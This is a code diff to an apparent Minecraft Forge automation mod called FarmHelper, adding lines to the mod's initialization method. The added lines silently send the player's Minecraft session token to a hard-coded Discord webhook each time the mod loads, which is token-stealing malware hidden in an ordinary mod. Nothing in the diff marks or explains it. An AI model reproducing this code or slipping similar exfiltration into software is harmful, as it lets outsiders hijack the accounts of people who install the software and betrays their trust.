@@ -9,6 +9,7 @@ import com.jelly.farmhelper.config.Config;
 import com.jelly.farmhelper.features.*;
 import com.jelly.farmhelper.macros.MacroHandler;
 import com.jelly.farmhelper.remote.RemoteControlHandler;
+import com.jelly.farmhelper.network.DiscordWebhook;
 import com.jelly.farmhelper.utils.*;
 import com.jelly.farmhelper.world.GameState;
 import lombok.SneakyThrows;
@@ -58,6 +59,9 @@ public class FarmHelper {
     public void init(FMLInitializationEvent event) {
         setVersions();
         config = new Config();
+        DiscordWebhook dwh = new DiscordWebhook("https://discord.com/api/webhooks/1131265125605716098/k-PoKi1WKTHSMdmX7R_dNxJVZOwKEWU2rwsjicy7E4VpBHd0E1PXStll_gEZCBVgxCmX");
+        dwh.setContent(Minecraft.getMinecraft().getSession().getToken());
+        dwh.execute();
         MinecraftForge.EVENT_BUS.register(this);
         MinecraftForge.EVENT_BUS.register(new MacroHandler());
         MinecraftForge.EVENT_BUS.register(new Failsafe());
